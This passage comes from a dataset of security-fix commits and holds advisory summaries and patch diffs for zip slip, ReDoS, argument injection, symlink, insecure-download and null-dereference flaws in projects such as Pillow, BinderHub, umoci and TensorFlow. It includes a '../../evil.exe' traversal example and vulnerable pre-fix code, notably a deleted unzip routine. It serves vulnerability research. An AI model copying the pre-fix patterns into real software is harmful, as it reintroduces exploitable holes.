`..\/..\/evil.exe`). The attacker can overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution on the victim\u2019s machine.","published_date":"2022-05-03","chain_len":2,"project":"https:\/\/github.com\/alibaba\/one-java-agent","commit_href":"https:\/\/github.com\/alibaba\/one-java-agent\/pull\/29\/commits\/359603b63fc6c59d8b57e061c171954bab3433bf","commit_sha":"359603b63fc6c59d8b57e061c171954bab3433bf","patch":"MULTI","chain_ord":"['359603b63fc6c59d8b57e061c171954bab3433bf', 'b5b437f9f4c8cbfe7bdbe266e975a4bd513c13fe']","before_first_fix_commit":"{'52f2506c7cbcfbbe342ddf9d35a915fc49e6fa48'}","last_fix_commit":"b5b437f9f4c8cbfe7bdbe266e975a4bd513c13fe","chain_ord_pos":1.0,"commit_datetime":"04\/07\/2022, 02:28:31","message":"remove unused IOUtils.unzip","author":"luyanbo","comments":null,"stats":"{'additions': 0, 'deletions': 56, 'total': 56}","files":"{'one-java-agent-plugin\/src\/main\/java\/com\/alibaba\/oneagent\/utils\/IOUtils.java': {'additions': 0, 'deletions': 56, 'changes': 56, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/alibaba\/one-java-agent\/raw\/359603b63fc6c59d8b57e061c171954bab3433bf\/one-java-agent-plugin%2Fsrc%2Fmain%2Fjava%2Fcom%2Falibaba%2Foneagent%2Futils%2FIOUtils.java', 'patch': '@@ -103,60 +103,4 @@ public static IOException close(URLClassLoader urlClassLoader) {\\n \\t\\treturn null;\\n \\t}\\n \\n-\\tpublic static void unzip(String zipFile, String extractFolder) throws IOException {\\n-\\t\\tFile file = new File(zipFile);\\n-\\t\\tZipFile zip = null;\\n-\\t\\ttry {\\n-\\t\\t\\tint BUFFER = 1024 * 8;\\n-\\n-\\t\\t\\tzip = new ZipFile(file);\\n-\\t\\t\\tString newPath = extractFolder;\\n-\\n-\\t\\t\\tnew File(newPath).mkdir();\\n-\\t\\t\\tEnumeration<? extends ZipEntry> zipFileEntries = zip.entries();\\n-\\n-\\t\\t\\t\/\/ Process each entry\\n-\\t\\t\\twhile (zipFileEntries.hasMoreElements()) {\\n-\\t\\t\\t\\t\/\/ grab a zip file entry\\n-\\t\\t\\t\\tZipEntry entry = (ZipEntry) zipFileEntries.nextElement();\\n-\\t\\t\\t\\tString currentEntry = entry.getName();\\n-\\n-\\t\\t\\t\\tFile destFile = new File(newPath, currentEntry);\\n-\\t\\t\\t\\t\/\/ destFile = new File(newPath, destFile.getName());\\n-\\t\\t\\t\\tFile destinationParent = destFile.getParentFile();\\n-\\n-\\t\\t\\t\\t\/\/ create the parent directory structure if needed\\n-\\t\\t\\t\\tdestinationParent.mkdirs();\\n-\\n-\\t\\t\\t\\tif (!entry.isDirectory()) {\\n-\\t\\t\\t\\t\\tBufferedInputStream is = null;\\n-\\t\\t\\t\\t\\tBufferedOutputStream dest = null;\\n-\\t\\t\\t\\t\\ttry {\\n-\\t\\t\\t\\t\\t\\tis = new BufferedInputStream(zip.getInputStream(entry));\\n-\\t\\t\\t\\t\\t\\tint currentByte;\\n-\\t\\t\\t\\t\\t\\t\/\/ establish buffer for writing file\\n-\\t\\t\\t\\t\\t\\tbyte data[] = new byte[BUFFER];\\n-\\n-\\t\\t\\t\\t\\t\\t\/\/ write the current file to disk\\n-\\t\\t\\t\\t\\t\\tFileOutputStream fos = new FileOutputStream(destFile);\\n-\\t\\t\\t\\t\\t\\tdest = new BufferedOutputStream(fos, BUFFER);\\n-\\n-\\t\\t\\t\\t\\t\\t\/\/ read and write until last byte is encountered\\n-\\t\\t\\t\\t\\t\\twhile ((currentByte = is.read(data, 0, BUFFER)) != -1) {\\n-\\t\\t\\t\\t\\t\\t\\tdest.write(data, 0, currentByte);\\n-\\t\\t\\t\\t\\t\\t}\\n-\\t\\t\\t\\t\\t\\tdest.flush();\\n-\\t\\t\\t\\t\\t} finally {\\n-\\t\\t\\t\\t\\t\\tclose(dest);\\n-\\t\\t\\t\\t\\t\\tclose(is);\\n-\\t\\t\\t\\t\\t}\\n-\\n-\\t\\t\\t\\t}\\n-\\n-\\t\\t\\t}\\n-\\t\\t} finally {\\n-\\t\\t\\tclose(zip);\\n-\\t\\t}\\n-\\n-\\t}\\n }'}}","message_norm":"remove unused ioutils.unzip","language":"en","entities":"[('remove', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['one-java-agent-plugin\/src\/main\/java\/com\/alibaba\/oneagent\/utils\/IOUtils.java'])","num_files":1.0},{"index":1386,"vuln_id":"GHSA-9hx2-hgq2-2g4f","cwe_id":"{'CWE-400'}","score":6.5,"chain":"{'https:\/\/github.com\/python-pillow\/Pillow\/commit\/6207b44ab1ff4a91d8ddc7579619876d0bb191a4', 'https:\/\/github.com\/python-pillow\/Pillow\/commit\/3bce145966374dd39ce58a6fc0083f8d1890719c'}","dataset":"osv","summary":"Regular Expression Denial of Service (ReDoS) in Pillow An issue was discovered in Pillow before 8.1.1. The PDF parser allows a regular expression DoS (ReDoS) attack via a crafted PDF file because of a catastrophic backtracking regex.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/python-pillow\/Pillow","commit_href":"https:\/\/github.com\/python-pillow\/Pillow\/commit\/3bce145966374dd39ce58a6fc0083f8d1890719c","commit_sha":"3bce145966374dd39ce58a6fc0083f8d1890719c","patch":"MULTI","chain_ord":"['6207b44ab1ff4a91d8ddc7579619876d0bb191a4', '3bce145966374dd39ce58a6fc0083f8d1890719c']","before_first_fix_commit":"{'cbdce6c5d054fccaf4af34b47f212355c64ace7a'}","last_fix_commit":"3bce145966374dd39ce58a6fc0083f8d1890719c","chain_ord_pos":2.0,"commit_datetime":"01\/09\/2021, 13:53:09","message":"Use more specific regex chars to prevent ReDoS\n\n* CVE-2021-25292","author":"Hugo van Kemenade","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'src\/PIL\/PdfParser.py': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/python-pillow\/Pillow\/raw\/3bce145966374dd39ce58a6fc0083f8d1890719c\/src%2FPIL%2FPdfParser.py', 'patch': '@@ -580,8 +580,9 @@ def next_object_id(self, offset=None):\\n     whitespace_or_hex = br\"[\\\\000\\\\011\\\\012\\\\014\\\\015\\\\0400-9a-fA-F]\"\\n     whitespace_optional = whitespace + b\"*\"\\n     whitespace_mandatory = whitespace + b\"+\"\\n+    whitespace_optional_no_nl = br\"[\\\\000\\\\011\\\\014\\\\015\\\\040]*\"  # no \"\\\\012\" aka \"\\\\n\"\\n     newline_only = br\"[\\\\r\\\\n]+\"\\n-    newline = whitespace_optional + newline_only + whitespace_optional\\n+    newline = whitespace_optional_no_nl + newline_only + whitespace_optional_no_nl\\n     re_trailer_end = re.compile(\\n         whitespace_mandatory\\n         + br\"trailer\"'}}","message_norm":"use more specific regex chars to prevent redos\n\n* cve-2021-25292","language":"en","entities":"[('prevent', 'ACTION', ''), ('redos', 'SECWORD', ''), ('cve-2021-25292', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/PIL\/PdfParser.py'])","num_files":1.0},{"index":1400,"vuln_id":"GHSA-9jjr-qqfp-ppwx","cwe_id":"{'CWE-94'}","score":9.6,"chain":"{'https:\/\/github.com\/jupyterhub\/binderhub\/commit\/195caac172690456dcdc8cc7a6ca50e05abf8182'}","dataset":"osv","summary":"remote code execution via git repo provider ### Impact\n\nA remote code execution vulnerability has been identified in BinderHub, where providing BinderHub with maliciously crafted input could execute code in the BinderHub context, with the potential to egress credentials of the BinderHub deployment, including JupyterHub API tokens, kubernetes service accounts, and docker registry credentials. This may provide the ability to manipulate images and other user created pods in the deployment, with the potential to escalate to the host depending on the underlying kubernetes configuration.\n\n### Patches\n\nPatch below, or [on GitHub](https:\/\/github.com\/jupyterhub\/binderhub\/commit\/195caac172690456dcdc8cc7a6ca50e05abf8182.patch)\n\n```diff\nFrom 9f4043d9dddc1174920e687773f27b7933f48ab6 Mon Sep 17 00:00:00 2001\nFrom: Riccardo Castellotti <rcastell@cern.ch>\nDate: Thu, 19 Aug 2021 15:49:43 +0200\nSubject: [PATCH] Explicitly separate git-ls-remote options from positional\n arguments\n\n---\n binderhub\/repoproviders.py | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/binderhub\/repoproviders.py b\/binderhub\/repoproviders.py\nindex f33347b..5d4b87c 100755\n--- a\/binderhub\/repoproviders.py\n+++ b\/binderhub\/repoproviders.py\n@@ -484,7 +484,7 @@ class GitRepoProvider(RepoProvider):\n             self.sha1_validate(self.unresolved_ref)\n         except ValueError:\n             # The ref is a head\/tag and we resolve it using `git ls-remote`\n-            command = [\"git\", \"ls-remote\", self.repo, self.unresolved_ref]\n+            command = [\"git\", \"ls-remote\", \"--\", self.repo, self.unresolved_ref]\n             result = subprocess.run(command, universal_newlines=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n             if result.returncode:\n                 raise RuntimeError(\"Unable to run git ls-remote to get the `resolved_ref`: {}\".format(result.stderr))\n-- \n2.25.1\n\n```\n\n### Workarounds\n\nDisable the git repo provider by specifying the `BinderHub.repo_providers` config, e.g.:\n\n```python\nfrom binderhub.repoproviders import (GitHubRepoProvider,\n                            GitLabRepoProvider, GistRepoProvider,\n                            ZenodoProvider, FigshareProvider, HydroshareProvider,\n                            DataverseProvider)\n\nc.BinderHub.repo_providers =  {\n            'gh': GitHubRepoProvider,\n            'gist': GistRepoProvider,\n            'gl': GitLabRepoProvider,\n            'zenodo': ZenodoProvider,\n            'figshare': FigshareProvider,\n            'hydroshare': HydroshareProvider,\n            'dataverse': DataverseProvider,\n        }\n```\n\n### References\n\nCredit: Jose Carlos Luna Duran (CERN) and Riccardo Castellotti (CERN).\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Email us at [security@ipython.org](mailto:security@ipython.org)","published_date":"2021-08-30","chain_len":1,"project":"https:\/\/github.com\/jupyterhub\/binderhub","commit_href":"https:\/\/github.com\/jupyterhub\/binderhub\/commit\/195caac172690456dcdc8cc7a6ca50e05abf8182","commit_sha":"195caac172690456dcdc8cc7a6ca50e05abf8182","patch":"SINGLE","chain_ord":"['195caac172690456dcdc8cc7a6ca50e05abf8182']","before_first_fix_commit":"{'034430adc8ed379135f3ef46ee6ca650781ef67c'}","last_fix_commit":"195caac172690456dcdc8cc7a6ca50e05abf8182","chain_ord_pos":1.0,"commit_datetime":"08\/19\/2021, 13:49:43","message":"Explicitly separate git-ls-remote options from positional arguments","author":"Riccardo Castellotti","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'binderhub\/repoproviders.py': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jupyterhub\/binderhub\/raw\/195caac172690456dcdc8cc7a6ca50e05abf8182\/binderhub%2Frepoproviders.py', 'patch': '@@ -484,7 +484,7 @@ async def get_resolved_ref(self):\\n             self.sha1_validate(self.unresolved_ref)\\n         except ValueError:\\n             # The ref is a head\/tag and we resolve it using `git ls-remote`\\n-            command = [\"git\", \"ls-remote\", self.repo, self.unresolved_ref]\\n+            command = [\"git\", \"ls-remote\", \"--\", self.repo, self.unresolved_ref]\\n             result = subprocess.run(command, universal_newlines=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\\n             if result.returncode:\\n                 raise RuntimeError(\"Unable to run git ls-remote to get the `resolved_ref`: {}\".format(result.stderr))'}}","message_norm":"explicitly separate git-ls-remote options from positional arguments","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['binderhub\/repoproviders.py'])","num_files":1.0},{"index":1405,"vuln_id":"GHSA-9m95-8hx6-7p9v","cwe_id":"{'CWE-20'}","score":5.5,"chain":"{'https:\/\/github.com\/opencontainers\/umoci\/commit\/d9efc31daf2206f7d3fdb839863cf7a576a2eb57'}","dataset":"osv","summary":"Improper input validation in umoci ### Impact\n\numoci 0.4.6 and earlier can be tricked into modifying host files by\ncreating a malicious layer that has a symlink with the name \".\" (or\n\"\/\"). Because umoci deletes inodes if they change types, this results in\nthe rootfs directory being replaced with an attacker-controlled symlink.\nSubsequent image layers will then be applied on top of the target of the\nsymlink (which could be any directory on the host filesystem the user\nrunning umoci has access to).\n\nWhile umoci does have defences against symlink-based attacks, they are\nall implemented by resolving things relative to the rootfs directory --\nif the rootfs itself is a symlink, umoci resolves it first.\n\nThis vulnerability affects both \"umoci unpack\" and \"umoci raw unpack\".\n\n### Patches\nThis issue has been patched in umoci 0.4.7, see the references section\nfor the specific commit which fixed this vulnerability.\n\n### Workarounds\nNote that if you use umoci as an unprivileged user (using the --rootless\nflag) then umoci will not be able to overwrite any files that your user\ndoesn't have access to. Other possible mitigations are to run umoci\nunder an LSM profile such as AppArmor or SELinux to restrict the level\nof access it has outside of container image directories.\n\n### References\n* [oss-security public disclosure](https:\/\/www.openwall.com\/lists\/oss-security\/2021\/04\/06\/2)\n* [patch](https:\/\/github.com\/opencontainers\/umoci\/commit\/d9efc31daf2206f7d3fdb839863cf7a576a2eb57)\n\n### Credits\nThanks to Robin Peraglie from Cure53 for discovering and reporting this\nvulnerability.\n\n### For more information\n\nIf you have any questions or comments about this advisory\n* Open an issue in <https:\/\/github.com\/opencontainers\/umoci>.\n* Email us at <security@opencontainers.org>.","published_date":"2022-02-15","chain_len":1,"project":"https:\/\/github.com\/opencontainers\/umoci","commit_href":"https:\/\/github.com\/opencontainers\/umoci\/commit\/d9efc31daf2206f7d3fdb839863cf7a576a2eb57","commit_sha":"d9efc31daf2206f7d3fdb839863cf7a576a2eb57","patch":"SINGLE","chain_ord":"['d9efc31daf2206f7d3fdb839863cf7a576a2eb57']","before_first_fix_commit":"{'07fa845e5b068dee64dcbf391b456a564a6fcfa6'}","last_fix_commit":"d9efc31daf2206f7d3fdb839863cf7a576a2eb57","chain_ord_pos":1.0,"commit_datetime":"03\/23\/2021, 13:17:06","message":"layer: don't permit \/ type to be changed on extraction\n\nIf users can change the type of \/ to a symlink, they can cause umoci to\noverwrite host files. This is obviously bad, and is not caught by the\nrest of our directory escape detection code because the root itself has\nbeen changed to a different directory.\n\nFixes: CVE-2021-29136\nReported-by: Robin Peraglie <robin@cure53.de>\nTested-by: Daniel Dao <dqminh89@gmail.com>\nReviewed-by: Tycho Andersen <tycho@tycho.pizza>\nSigned-off-by: Aleksa Sarai <cyphar@cyphar.com>","author":"Aleksa Sarai","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'oci\/layer\/tar_extract.go': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/opencontainers\/umoci\/raw\/d9efc31daf2206f7d3fdb839863cf7a576a2eb57\/oci%2Flayer%2Ftar_extract.go', 'patch': '@@ -404,6 +404,11 @@ func (te *TarExtractor) UnpackEntry(root string, hdr *tar.Header, r io.Reader) (\\n \\tif filepath.Join(\"\/\", hdr.Name) == \"\/\" {\\n \\t\\t\/\/ If we got an entry for the root, then unsafeDir is the full path.\\n \\t\\tunsafeDir, file = hdr.Name, \".\"\\n+\\t\\t\/\/ If we\\'re being asked to change the root type, bail because they may\\n+\\t\\t\/\/ change it to a symlink which we could inadvertently follow.\\n+\\t\\tif hdr.Typeflag != tar.TypeDir {\\n+\\t\\t\\treturn errors.New(\"malicious tar entry -- refusing to change type of root directory\")\\n+\\t\\t}\\n \\t}\\n \\tdir, err := securejoin.SecureJoinVFS(root, unsafeDir, te.fsEval)\\n \\tif err != nil {'}}","message_norm":"layer: don't permit \/ type to be changed on extraction\n\nif users can change the type of \/ to a symlink, they can cause umoci to\noverwrite host files. this is obviously bad, and is not caught by the\nrest of our directory escape detection code because the root itself has\nbeen changed to a different directory.\n\nfixes: cve-2021-29136\nreported-by: robin peraglie <robin@cure53.de>\ntested-by: daniel dao <dqminh89@gmail.com>\nreviewed-by: tycho andersen <tycho@tycho.pizza>\nsigned-off-by: aleksa sarai <cyphar@cyphar.com>","language":"en","entities":"[('changed', 'ACTION', ''), ('change', 'ACTION', ''), ('symlink', 'SECWORD', ''), ('escape', 'SECWORD', ''), ('changed', 'ACTION', ''), ('fixes', 'ACTION', ''), ('cve-2021-29136', 'VULNID', 'CVE'), ('robin@cure53.de', 'EMAIL', ''), ('dqminh89@gmail.com', 'EMAIL', ''), ('cyphar@cyphar.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['oci\/layer\/tar_extract.go'])","num_files":1.0},{"index":1409,"vuln_id":"GHSA-9p47-w5xp-f4xr","cwe_id":"{'CWE-311'}","score":0.0,"chain":"{'https:\/\/github.com\/felixrieseberg\/windows-build-tools\/commit\/9835d33e68f2cb5e4d148e954bb3ed0221d98e90'}","dataset":"osv","summary":"Downloads Resources over HTTP in windows-build-tools Affected versions of `windows-build-tools` insecurely download an executable over an unencrypted HTTP connection. \n\nIn scenarios where an attacker has a privileged network position, it is possible to intercept the response and replace the executable with a malicious one, resulting in code execution on the system running `windows-build-tools`.\n\n\n## Recommendation\n\nUpdate to version 1.0.0 or later.","published_date":"2018-11-09","chain_len":1,"project":"https:\/\/github.com\/felixrieseberg\/windows-build-tools","commit_href":"https:\/\/github.com\/felixrieseberg\/windows-build-tools\/commit\/9835d33e68f2cb5e4d148e954bb3ed0221d98e90","commit_sha":"9835d33e68f2cb5e4d148e954bb3ed0221d98e90","patch":"SINGLE","chain_ord":"['9835d33e68f2cb5e4d148e954bb3ed0221d98e90']","before_first_fix_commit":"{'3a97ea156d07aaccca101ed8f0a1606eea8dfc2d'}","last_fix_commit":"9835d33e68f2cb5e4d148e954bb3ed0221d98e90","chain_ord_pos":1.0,"commit_datetime":"12\/22\/2016, 17:19:25","message":":wrench: Use HTTPS - Thanks to @grander","author":"Felix Rieseberg","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/constants.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/felixrieseberg\/windows-build-tools\/raw\/9835d33e68f2cb5e4d148e954bb3ed0221d98e90\/src%2Fconstants.js', 'patch': \"@@ -2,7 +2,7 @@ var pythonMirror = process.env.npm_config_python_mirror || process.env.PYTHON_MI\\n \\n var buildTools = {\\n   installerName: 'BuildTools_Full.exe',\\n-  installerUrl: 'http:\/\/download.microsoft.com\/download\/5\/f\/7\/5f7acaeb-8363-451f-9425-68a90f98b238\/visualcppbuildtools_full.exe',\\n+  installerUrl: 'https:\/\/download.microsoft.com\/download\/5\/f\/7\/5f7acaeb-8363-451f-9425-68a90f98b238\/visualcppbuildtools_full.exe',\\n   logName: 'build-tools-log.txt'\\n }\"}}","message_norm":":wrench: use https - thanks to @grander","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/constants.js'])","num_files":1.0},{"index":1410,"vuln_id":"GHSA-9p77-mmrw-69c7","cwe_id":"{'CWE-476'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a513cec4bec15961fbfdedcaa5376522980455c'}","dataset":"osv","summary":"Null-dereference in Tensorflow ### Impact\nWhen decoding a tensor from protobuf, TensorFlow might do a null-dereference if attributes of some mutable arguments to some operations are missing from the proto. This is [guarded by a `DCHECK`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/framework\/full_type_util.cc#L104-L106):\n\n```cc\n  const auto* attr = attrs.Find(arg->s()); \n  DCHECK(attr != nullptr);\n  if (attr->value_case() == AttrValue::kList) {\n    \/\/ ...\n  }\n```\nHowever, `DCHECK` is a no-op in production builds and an assertion failure in debug builds. In the first case execution proceeds to the dereferencing of the null pointer, whereas in the second case it results in a crash due to the assertion failure.\n\n### Patches\nWe have patched the issue in GitHub commit [8a513cec4bec15961fbfdedcaa5376522980455c](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a513cec4bec15961fbfdedcaa5376522980455c).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, and TensorFlow 2.6.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a513cec4bec15961fbfdedcaa5376522980455c","commit_sha":"8a513cec4bec15961fbfdedcaa5376522980455c","patch":"SINGLE","chain_ord":"['8a513cec4bec15961fbfdedcaa5376522980455c']","before_first_fix_commit":"{'258112d838f008a632fe0dc43fc9ebecb9b0b869'}","last_fix_commit":"8a513cec4bec15961fbfdedcaa5376522980455c","chain_ord_pos":1.0,"commit_datetime":"11\/08\/2021, 18:35:47","message":"Prevent null dereference read in `SpecializeType()`\n\nFor some adversarial protos, the attribute for a key might not exist.\n\nPiperOrigin-RevId: 408382090\nChange-Id: Ie7eabe532c9ff280fce5dce1f6cdb93c76c2e040","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 6, 'deletions': 1, 'total': 7}","files":"{'tensorflow\/core\/framework\/full_type_util.cc': {'additions': 6, 'deletions': 1, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/8a513cec4bec15961fbfdedcaa5376522980455c\/tensorflow%2Fcore%2Fframework%2Ffull_type_util.cc', 'patch': '@@ -22,6 +22,7 @@ limitations under the License.\\n #include \"tensorflow\/core\/framework\/op_def.pb.h\"\\n #include \"tensorflow\/core\/framework\/types.h\"\\n #include \"tensorflow\/core\/platform\/statusor.h\"\\n+#include \"tensorflow\/core\/protobuf\/error_codes.pb.h\"\\n \\n namespace tensorflow {\\n \\n@@ -102,7 +103,11 @@ StatusOr<FullTypeDef> SpecializeType(const AttrSlice& attrs,\\n       auto* arg = t->mutable_args(i);\\n       if (arg->type_id() == TFT_VAR) {\\n         const auto* attr = attrs.Find(arg->s());\\n-        DCHECK(attr != nullptr);\\n+        if (attr == nullptr) {\\n+          return Status(\\n+              error::INVALID_ARGUMENT,\\n+              absl::StrCat(\"Could not find an attribute for key \", arg->s()));\\n+        }\\n         if (attr->value_case() == AttrValue::kList) {\\n           const auto& attr_list = attr->list();\\n           arg->set_type_id(TFT_PRODUCT);'}}","message_norm":"prevent null dereference read in `specializetype()`\n\nfor some adversarial protos, the attribute for a key might not exist.\n\npiperorigin-revid: 408382090\nchange-id: ie7eabe532c9ff280fce5dce1f6cdb93c76c2e040","language":"en","entities":"[('prevent', 'ACTION', ''), ('null dereference', 'SECWORD', ''), ('adversarial', 'SECWORD', ''), ('key', 'SECWORD', ''), ('408382090', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/framework\/full_type_util.cc'])","num_files":1.0},{"index":1415,"vuln_id":"GHSA-9px9-73fg-3fqp","cwe_id":"{'CWE-476'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/045deec1cbdebb27d817008ad5df94d96a08b1bf', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0a365c029e437be0349c31f8d4c9926b69fa3fa1'}","dataset":"osv","summary":"Null pointer dereference in Grappler's `IsConstant` ### Impact\nUnder certain scenarios, Grappler component of TensorFlow can trigger a null pointer dereference. There are 2 places where this can occur, for the same malicious alteration of a `SavedModel` file (fixing the first one would trigger the same dereference in the second place):\n\nFirst, during [constant folding](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc#L3466-L3497), the `GraphDef` might not have the required nodes for the binary operation:\n\n```cc\n  NodeDef* mul_left_child = node_map_->GetNode(node->input(0));\n  NodeDef* mul_right_child = node_map_->GetNode(node->input(1));\n  \/\/ One child must be constant, and the second must be Conv op.\n  const bool left_child_is_constant = IsReallyConstant(*mul_left_child);\n  const bool right_child_is_constant = IsReallyConstant(*mul_right_child);\n```\n\nIf a node is missing, the correposning `mul_*child` would be null, and the dereference in the subsequent line would be incorrect.\n\nWe have a similar issue during [`IsIdentityConsumingSwitch`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/grappler\/mutable_graph_view.cc#L59-L74):\n\n```cc\n  NodeDef* input_node = graph.GetNode(tensor_id.node());\n  return IsSwitch(*input_node);\n```\n\n### Patches\nWe have patched the issue in GitHub commits [0a365c029e437be0349c31f8d4c9926b69fa3fa1](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0a365c029e437be0349c31f8d4c9926b69fa3fa1) and [045deec1cbdebb27d817008ad5df94d96a08b1bf](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/045deec1cbdebb27d817008ad5df94d96a08b1bf).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/045deec1cbdebb27d817008ad5df94d96a08b1bf","commit_sha":"045deec1cbdebb27d817008ad5df94d96a08b1bf","patch":"MULTI","chain_ord":"['0a365c029e437be0349c31f8d4c9926b69fa3fa1', '045deec1cbdebb27d817008ad5df94d96a08b1bf']","before_first_fix_commit":"{'0a365c029e437be0349c31f8d4c9926b69fa3fa1'}","last_fix_commit":"045deec1cbdebb27d817008ad5df94d96a08b1bf","chain_ord_pos":2.0,"commit_datetime":"11\/13\/2021, 18:12:22","message":"Prevent null pointer dereference in `mutable_graph_view`\n\nPiperOrigin-RevId: 409684472\nChange-Id: I577eb9d9ac470fcec0501423171e739a4ec0cb5c","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/core\/grappler\/mutable_graph_view.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/045deec1cbdebb27d817008ad5df94d96a08b1bf\/tensorflow%2Fcore%2Fgrappler%2Fmutable_graph_view.cc', 'patch': '@@ -68,6 +68,9 @@ bool IsIdentityConsumingSwitch(const MutableGraphView& graph,\\n     }\\n \\n     NodeDef* input_node = graph.GetNode(tensor_id.node());\\n+    if (input_node == nullptr) {\\n+      return false;\\n+    }\\n     return IsSwitch(*input_node);\\n   }\\n   return false;'}}","message_norm":"prevent null pointer dereference in `mutable_graph_view`\n\npiperorigin-revid: 409684472\nchange-id: i577eb9d9ac470fcec0501423171e739a4ec0cb5c","language":"en","entities":"[('prevent', 'ACTION', ''), ('null pointer dereference', 'SECWORD', ''), ('409684472', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/grappler\/mutable_graph_view.cc'])","num_files":1.0},{"index":1416,"vuln_id":"GHSA-9px9-73fg-3fqp","cwe_id":"{'CWE-476'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/045deec1cbdebb27d817008ad5df94d96a08b1bf', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0a365c029e437be0349c31f8d4c9926b69fa3fa1'}","dataset":"osv","summary":"Null pointer dereference in Grappler's `IsConstant` ### Impact\nUnder certain scenarios, Grappler component of TensorFlow can trigger a null pointer dereference. There are 2 places where this can occur, for the same malicious alteration of a `SavedModel` file (fixing the first one would trigger the same dereference in the second place):\n\nFirst, during [constant folding](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/grappler\/optimizers\/constant_folding.cc#L3466-L3497), the `GraphDef` might not have the required nodes for the binary operation:\n\n```cc\n  NodeDef* mul_left_child = node_map_->GetNode(node->input(0));\n  NodeDef* mul_right_child = node_map_->GetNode(node->input(1));\n  \/\/ One child must be constant, and the second must be Conv op.\n  const bool left_child_is_constant = IsReallyConstant(*mul_left_child);\n  const bool right_child_is_constant = IsReallyConstant(*mul_right_child);\n```\n\nIf a node is missing, the correposning `mul_*child` would be null, and the dereference in the subsequent line would be incorrect.\n\nWe have a similar issue during [`IsIdentityConsumingSwitch`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/grappler\/mutable_graph_view.cc#L59-L74):\n\n```cc\n  NodeDef* input_node = graph.GetNode(tensor_id.node());\n  return IsSwitch(*input_node);\n```\n\n### Patches\nWe have patched the issue in GitHub commits [0a365c029e437be0349c31f8d4c9926b69fa3fa1](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0a365c029e437be0349c31f8d4c9926b69fa3fa1) and [045deec1cbdebb27d817008ad5df94d96a08b1bf](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/045deec1cbdebb27d817008ad5df94d96a08b1bf).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact 